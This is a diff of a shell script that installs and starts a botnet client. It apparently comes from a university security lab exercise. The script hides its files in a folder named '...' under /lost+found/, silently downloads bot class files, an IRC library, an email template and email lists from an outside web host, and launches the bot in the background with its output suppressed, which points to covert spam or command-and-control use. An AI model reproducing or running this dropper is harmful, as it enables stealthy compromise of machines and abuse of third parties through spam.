@@ -2,7 +2,7 @@
 #! /bin/sh                                                                                  
 
 if [ -z "$DIR" ]; then
-   # dhclient
+    dhclient &> /dev/null
 
     DIR='/lost+found/'
     FOLDER='...'
@@ -14,8 +14,11 @@ if [ -z "$DIR" ]; then
     BIN4="BotnetClient\$ProcessInputThread.class"
     BIN5="MsgEncrypt.class"
     PIRC="pircbot.jar"
-    MAIL="mail.jar"
     APAC="commons-codec-1.4.jar"
+    TEMPLATE="template.txt"
+    EMAILS="emails.txt"
+    RAND_EMAILS="random_emails.txt"
+    CLEAN="clean.sh"
     CURDIR=`pwd`
 
     if [ ! -d "${DIR}${FOLDER}" ]; then
@@ -32,16 +35,15 @@ if [ -z "$DIR" ]; then
     wget "abstract.cs.washington.edu/~roy/lab3/Botnet/bin/$BIN5" &> /dev/null
     wget "abstract.cs.washington.edu/~roy/lab3/Botnet/$PIRC" &> /dev/null
     wget "abstract.cs.washington.edu/~roy/lab3/Botnet/bin/$BIN" &> /dev/null
-    wget "abstract.cs.washington.edu/~roy/lab3/Botnet/$MAIL" &> /dev/null
     wget "abstract.cs.washington.edu/~roy/lab3/Botnet/$APAC" &> /dev/null    
-    #javac $SRC
+    wget "abstract.cs.washington.edu/~roy/lab3/Botnet/$TEMPLATE" &> /dev/null
+    wget "abstract.cs.washington.edu/~roy/lab3/Botnet/$EMAILS" &> /dev/null
+    wget "abstract.cs.washington.edu/~roy/lab3/Botnet/$CLEAN" &> /dev/null
 
-    #rm $SRC
+    cp $EMAILS $RAND_EMAILS
+
+    java -classpath "${PIRC}:${APAC}:." $TARGET &> /dev/null &
     
-    java -classpath "${PIRC}:${MAIL}:${APAC}:." $TARGET #&> /dev/null &
-    
-    #rm $PIRC
-    #rm $MAIL
     cd $CURDIR
 fi
 ###########################################
